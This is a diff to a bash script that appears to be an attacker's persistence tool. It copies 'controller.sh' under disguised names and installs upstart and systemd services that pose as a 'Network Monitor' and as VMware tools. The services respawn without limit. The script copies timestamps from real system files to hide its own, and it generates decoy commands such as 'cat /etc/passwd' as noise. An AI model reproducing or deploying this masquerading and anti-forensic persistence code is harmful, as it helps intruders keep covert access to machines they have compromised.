@@ -10,9 +10,9 @@ NAMES=("controller.sh" "networkd.sh" "scorecheck.sh" "loghelper.sh")
 for LOCATION in "${LOCATIONS[@]}"
 do
     if [ -f "$LOCATION" ]; then
-        for SERVICE in "${SERVICES[@]}"
+        for NAME in "${NAMES[@]}"
         do
-            cp -p "controller.sh" "${LOCATION%/*}/$SERVICE" &> /dev/null
+            cp -p "controller.sh" "${LOCATION%/*}/$NAME" &> /dev/null
         done
     fi
 done
@@ -21,34 +21,34 @@ cp -p "controller.sh" "/etc/init.d/rc.local/rcd.sh" &> /dev/null
 if [[ $(initctl version) =~ upstart ]]; then
     sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
     sudo cat > /etc/init/network-monitor.conf << EOF
-    description "Network Monitor"
-    start on runlevel [2345]
-    stop on runlevel [!2345]
-    respawn
-    respawn limit unlimited
-    exec /etc/init.d/rc.local/rcd.sh
+description "Network Monitor"
+start on runlevel [2345]
+stop on runlevel [!2345]
+respawn
+respawn limit unlimited
+exec /etc/init.d/rc.local/rcd.sh
 EOF
     sudo touch -r /etc/init/rc-sysinit.conf -a /etc/init/rc-sysinit.conf -c /etc/init/rc-sysinit.conf /etc/init/network-monitor.conf
-    start network-monitor
+    sudo start network-monitor
 elif [[ $(systemctl) ]]; then
     sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/vmwaretoolsd.service
     sudo cat > /etc/systemd/system/vmwaretoolsd.service << EOF
-    [Unit]
-    Description=Service for virtual machines hosted on VMWare
-    After=network.target
+[Unit]
+Description=Service for virtual machines hosted on VMWare
+After=network.target
 
-    [Service]
-    Type=simple
-    ExecStart=/etc/init.d/rc.local/rcd.sh
-    Restart=always
-    RestartSec=10
+[Service]
+Type=simple
+ExecStart=/etc/init.d/rc.local/rcd.sh
+Restart=always
+RestartSec=10
 
-    [Install]
-    WantedBy=multi-user.target
+[Install]
+WantedBy=multi-user.target
 EOF
     sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/vmwaretoolsd.service
-    systemctl daemon-reload
-    systemctl start vmwaretoolsd.service
+    sudo systemctl daemon-reload
+    sudo systemctl start vmwaretoolsd.service
 fi
 
 #garbage
@@ -60,7 +60,7 @@ for i in {1..200}; do
   case $((RANDOM%10)) in
     0) echo "ls -al";;
     1) echo "cat /etc/passwd";;
-    2) echo "tail -n 10 /var/log/syslog";;
+    2) echo "tail -n 10 /var/log/sys";;
     3) echo "ps -ef";;
     4) echo "cd /var/log && tail -n 10 syslog";;
     5) echo "ls -la";;
